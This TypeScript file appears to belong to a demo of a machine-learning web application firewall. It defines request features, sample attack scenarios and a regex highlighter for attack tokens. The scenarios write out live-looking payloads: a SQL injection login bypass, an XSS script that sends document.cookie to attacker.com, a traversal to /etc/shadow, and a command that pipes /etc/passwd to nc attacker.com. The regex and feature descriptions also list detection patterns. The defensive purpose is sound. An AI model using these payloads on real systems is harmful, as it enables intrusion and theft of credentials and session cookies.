export const FEATURE_METADATA: Record<
  string,
  { label: string; description: string; normalBaseline: number; unit: string }
> = {
  num_sql_keywords: {
    label: 'SQL Keywords',
    description: 'Detects reserved SQL query tokens (UNION, SELECT, DROP, OR 1=1, SLEEP)',
    normalBaseline: 0,
    unit: 'tokens',
  },
  num_xss_keywords: {
    label: 'XSS Vector Tokens',
    description: 'DOM manipulation and script execution vectors (<script>, onerror=, javascript:)',
    normalBaseline: 0,
    unit: 'tokens',
  },
  num_path_traversal_patterns: {
    label: 'Directory Traversal',
    description: 'Relative parent directory sequence patterns (../, ..\\, %2e%2e/)',
    normalBaseline: 0,
    unit: 'sequences',
  },
  num_command_injection_patterns: {
    label: 'OS Command Injection',
    description: 'Shell chaining operators and system binaries (; cat, | nc, && whoami, /etc/passwd)',
    normalBaseline: 0,
    unit: 'chains',
  },
  payload_entropy: {
    label: 'Shannon Entropy',
    description: 'Measures byte randomness. Unusually high entropy indicates obfuscation / packing.',
    normalBaseline: 3.4,
    unit: 'bits',
  },
  has_encoded_chars: {
    label: 'Encoded Characters',
    description: 'Hex, URL, or Unicode encoding techniques often used to evade WAF filters',
    normalBaseline: 0,
    unit: 'flag',
  },
  num_special_chars: {
    label: 'Special Characters',
    description: 'Non-alphanumeric punctuation commonly used for injection syntax delimiters',
    normalBaseline: 2,
    unit: 'chars',
  },
  url_length: {
    label: 'URL Length',
    description: 'Total URI string length. Outliers often correlate with parameter pollution',
    normalBaseline: 32,
    unit: 'chars',
  },
  body_length: {
    label: 'Body Length',
    description: 'Request payload byte count',
    normalBaseline: 45,
    unit: 'bytes',
  },
  uppercase_ratio: {
    label: 'Uppercase Ratio',
    description: 'Proportion of capital letters (e.g. SELECT * FROM users)',
    normalBaseline: 0.08,
    unit: 'ratio',
  },
  num_digits_ratio: {
    label: 'Digit Ratio',
    description: 'Proportion of numeric characters to total character volume',
    normalBaseline: 0.12,
    unit: 'ratio',
  },
  max_param_value_length: {
    label: 'Max Parameter Length',
    description: 'Length of the single longest parameter string',
    normalBaseline: 18,
    unit: 'chars',
  },
  num_parameters: {
    label: 'Parameter Count',
    description: 'Total key-value arguments supplied in query or multipart body',
    normalBaseline: 2,
    unit: 'params',
  },
  num_dots: {
    label: 'Dot Count',
    description: 'Count of period (.) characters, relevant to path traversal and IP lookups',
    normalBaseline: 1,
    unit: 'dots',
  },
  num_slashes: {
    label: 'Slash Count',
    description: 'Path delimiter hierarchy depth',
    normalBaseline: 3,
    unit: 'slashes',
  },
  avg_param_value_length: {
    label: 'Avg Param Length',
    description: 'Average character length across all provided parameters',
    normalBaseline: 12,
    unit: 'chars',
  },
  request_method: {
    label: 'HTTP Verb Value',
    description: 'Numeric mapping of HTTP method type (GET=1, POST=2, PUT=3, DELETE=4)',
    normalBaseline: 1,
    unit: 'id',
  },
  content_length_header: {
    label: 'Content-Length',
    description: 'Reported size from HTTP headers',
    normalBaseline: 50,
    unit: 'bytes',
  },
};

export const ATTACK_SCENARIOS = [
  {
    id: 'sqli-auth-bypass',
    title: 'SQL Injection — Auth Bypass',
    category: 'SQLi' as const,
    severity: 'CRITICAL' as const,
    targetEndpoint: '/api/login',
    method: 'POST' as const,
    description: "Classic tautology attack injects ' OR '1'='1' into the password check.",
    payload: {
      username: "admin' OR '1'='1' --",
      password: 'any_random_password',
    },
    explanation:
      'The AI Gateway ML Classifier detects SQL tokens (OR, --, single quotes) with 98.4% confidence and marks Anomaly Score = 0.89 (Threshold 0.28). Redis immediately issues a 1-hour IP block.',
    cwe: 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command',
  },
  {
    id: 'xss-product-review',
    title: 'Stored XSS — Cookie Stealer',
    category: 'XSS' as const,
    severity: 'HIGH' as const,
    targetEndpoint: '/api/products/1/reviews',
    method: 'POST' as const,
    description: 'Injects malicious script tag into the product reviews section.',
    payload: {
      rating: 5,
      comment: "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>Great laptop!",
    },
    explanation:
      'Hybrid CNN+BiLSTM Attention layer highlights the <script> and document.cookie vector. Blocked before persistent storage in the database.',
    cwe: 'CWE-79: Improper Neutralization of Input During Web Page Generation',
  },
  {
    id: 'path-traversal-passwd',
    title: 'Path Traversal — System Shadow Dump',
    category: 'Path Traversal' as const,
    severity: 'CRITICAL' as const,
    targetEndpoint: '/api/download?file=../../../../etc/shadow',
    method: 'GET' as const,
    description: 'Attempts to break out of webroot and read sensitive Linux shadow passwords.',
    payload: '',
    explanation:
      'The feature extractor detects repeated directory traversal sequences (../) with elevated special character density. Autoencoder reconstruction error hits 0.94.',
    cwe: 'CWE-22: Improper Limitation of a Pathname to a Restricted Directory',
  },
  {
    id: 'command-injection-ping',
    title: 'Command Injection — Reverse Shell',
    category: 'Command Injection' as const,
    severity: 'CRITICAL' as const,
    targetEndpoint: '/api/ping',
    method: 'POST' as const,
    description: 'Appends piped OS commands to backend network diagnostic tool.',
    payload: {
      host: '127.0.0.1; cat /etc/passwd | nc attacker.com 4444',
    },
    explanation:
      'Chained shell operators (;, |) and system binaries trigger immediate CRITICAL risk scoring. Gateway halts upstream transmission.',
    cwe: 'CWE-78: Improper Neutralization of Special Elements in an OS Command',
  },
  {
    id: 'credential-stuffing-burst',
    title: 'Credential Stuffing — Anomaly Burst',
    category: 'Credential Stuffing' as const,
    severity: 'HIGH' as const,
    targetEndpoint: '/api/login',
    method: 'POST' as const,
    description: 'Automated bot rapidly cycling through leaked email/password combinations.',
    payload: {
      username: 'victim@enterprise.com',
      password: 'password2024!',
    },
    explanation:
      'Sliding window rate-limiter in Redis tracks 35 requests within 2 seconds. Gateway activates 429 Too Many Requests and flags IP for automated mitigation.',
    cwe: 'CWE-307: Improper Restriction of Excessive Authentication Attempts',
  },
  {
    id: 'normal-customer-flow',
    title: 'Benign Traffic — Store Browsing',
    category: 'Normal' as const,
    severity: 'LOW' as const,
    targetEndpoint: '/api/products',
    method: 'GET' as const,
    description: 'Legitimate customer viewing electronics catalog and searching items.',
    payload: '',
    explanation:
      'Autoencoder reconstruction error = 0.04 (well below 0.28 threshold). ML engine returns ALLOW with 0.998 Normal probability. Forwarded to victim backend in 3.4ms.',
    cwe: 'Benign Traffic (Clean baseline)',
  },
];

/**
 * Highlights attack patterns inside strings for the Explainable AI inspector.
 */
export function highlightAttackPayload(raw: string): {
  hasSuspiciousTokens: boolean;
  tokens: string[];
  annotatedHtml: string;
} {
  if (!raw) return { hasSuspiciousTokens: false, tokens: [], annotatedHtml: '' };

  const attackRegex =
    /(\b(UNION|SELECT|FROM|WHERE|INSERT|DELETE|UPDATE|DROP|ALTER|OR|AND|EXEC|BENCHMARK|SLEEP)\b|--|\bOR\b\s+['"]?1['"]?\s*=\s*['"]?1|<script.*?>|<\/script>|javascript:|onerror\s*=|onload\s*=|document\.cookie|\.\.\/|\.\.\\|;\s*cat\b|;\s*whoami\b|\|\s*nc\b)/gi;

  const foundTokens: string[] = [];
  const annotated = raw.replace(attackRegex, (match) => {
    foundTokens.push(match);
    return `<mark class="threat-token-highlight">${match}</mark>`;
  });

  return {
    hasSuspiciousTokens: foundTokens.length > 0,
    tokens: Array.from(new Set(foundTokens)),
    annotatedHtml: annotated,
  };
}
